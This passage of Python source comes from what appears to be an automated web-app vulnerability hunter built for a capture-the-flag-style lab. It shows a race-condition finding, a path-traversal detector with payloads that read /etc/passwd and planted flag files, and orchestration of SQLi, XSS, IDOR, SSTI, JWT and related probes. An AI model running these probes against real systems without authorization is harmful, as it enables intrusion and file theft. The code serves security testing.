                    self._finding(
                        "race_condition", redeem_ep,
                        "Race Condition (double redemption / TOCTOU)",
                        f"Concurrent requests to the single-use redemption endpoint succeeded "
                        f"more than once — a read-then-write window without locking.",
                        f"Sent {n} concurrent POST {self._abs(redeem_ep)} with code={code!r}; "
                        f"{len(success)} succeeded. First responses: "
                        f"{success[0].text[:200]}",
                        "high", 0.85,
                        param="code", payload=code, method="POST", url=resps[0].url if resps else self._abs(redeem_ep),
                    )
                )
                break
        return findings

    # ---- Path traversal ---------------------------------------------------
    def _detect_path_traversal(self, endpoints: Dict[str, EndpointInfo]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        dl_ep = self._role(endpoints, "download", "file", "get", "static")
        if not dl_ep:
            return findings
        base = self._abs(dl_ep)
        read_params = ("file", "path", "name", "doc", "filename", "f")
        traversal_payloads = [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "..\\..\\..\\etc\\passwd",
            "/etc/passwd%00",
            "....//....//....//etc/passwd",
        ]
        flag_payloads = [
            "../elengenix_flag.txt",
            "../../elengenix_flag.txt",
            "../elengenix_vuln.db",
            "../../../etc/passwd",
        ]
        found_read = False
        flag = None
        read_param = None
        for param in read_params:
            for pl in traversal_payloads:
                r = self._get(dl_ep, params={param: pl})
                if r.ok and ("root:" in (r.text or "") or "[fonts]" in (r.text or "") or "Linux" in (r.text or "")):
                    found_read = True
                    read_param = param
                    # Now try to read the planted flag file to prove impact.
                    for fpl in flag_payloads:
                        fr = self._get(dl_ep, params={param: fpl})
                        flag = extract_flag(fr.text or "")
                        if flag:
                            break
                    evidence = (
                        f"Path traversal on GET {base} (param={param}={pl!r}) read a sensitive "
                        f"system file.\nSnippet: {r.text[:300]}"
                    )
                    if flag:
                        evidence += f"\n[IMPACT] FLAG extracted via traversal: {flag}"
                    findings.append(
                        self._finding(
                            "path_traversal", dl_ep,
                            "Path Traversal / LFI",
                            "The file download endpoint does not sanitize the path parameter, "
                            "allowing arbitrary file read (LFI).",
                            evidence,
                            "critical", 0.98 if flag else 0.9,
                            param=param, payload=pl, method="GET", url=r.url,
                        )
                    )
                    break
            if found_read:
                break
        return findings

    # ====================================================================== #
    # 3. ORCHESTRATION
    # ====================================================================== #
    def hunt(self, classes: Optional[List[str]] = None) -> WebAppHuntResult:
        """Run discovery + all detectors. Never raises."""
        t0 = time.time()
        result = WebAppHuntResult(base_url=self.base_url)
        try:
            endpoints = self.discover()
            result.endpoints = list(endpoints.values())
            logger.info("webapp_hunter: discovered %d endpoints on %s", len(endpoints), self.base_url)

            # mass-assignment must run BEFORE idor (idor may reuse the PoC account),
            # and sqli before race (sqli leaks coupon codes used by the race detector).
            ordered = [
                "mass_assignment", "sqli", "xss", "xss_stored", "idor",
                "ssti", "jwt_none", "prototype_pollution", "race_condition", "path_traversal",
            ]
            runner: Dict[str, Any] = {
                "mass_assignment": self._detect_mass_assignment,
                "sqli": self._detect_sqli,
                "xss": self._detect_xss,
                "xss_stored": self._detect_stored_xss,
                "idor": self._detect_idor,
                "ssti": self._detect_ssti,
                "jwt_none": self._detect_jwt_none,
                "prototype_pollution": self._detect_proto_pollution,
                "race_condition": self._detect_race,
                "path_traversal": self._detect_path_traversal,
            }
            for name in ordered:
                if classes and name not in classes and (classes and name not in [c for c in classes]):
                    continue
                try:
                    fs = runner[name](endpoints)
                    # Keep distinct findings even when they share type+endpoint
                    # (e.g. SQLi auth-bypass AND SQLi UNION data-extraction on
                    # the same login endpoint — the latter carries the flag).
                    seen = {(x["type"], x["endpoint"], x["title"]) for x in result.findings}
                    for f in fs:
                        key = (f["type"], f["endpoint"], f.get("title", ""))
                        if key not in seen:
                            result.findings.append(f)
                            seen.add(key)
                except Exception as e:
                    logger.debug("detector %s failed: %s", name, e)

            # Impact proven = classes whose evidence contains a flag.
            for f in result.findings:
                if _flag_present(str(f.get("evidence", ""))):
                    if f["type"] not in result.impact_proven:
                        result.impact_proven.append(f["type"])
        except Exception as e:  # pragma: no cover
            logger.error("webapp_hunter fatal: %s", e)
            result.error = str(e)
        finally:
            try:
                self._sess.close()
            except Exception:
                pass
        result.duration = time.time() - t0
        return result


# ---------------------------------------------------------------------------#
# Convenience entry point
# ---------------------------------------------------------------------------#


def run_webapp_hunt(
    base_url: str,
    allow_public: bool = False,
    concurrent: int = 10,
    max_words: Optional[int] = None,
    timeout: float = 8.0,
) -> Tuple[List[Dict[str, Any]], str]:
    """Run the hunter and return (findings, summary_text)."""
    result = WebAppHunter(
        base_url, allow_public=allow_public, concurrent=concurrent, max_words=max_words, timeout=timeout
    ).hunt()
    return result.findings, result.summary()
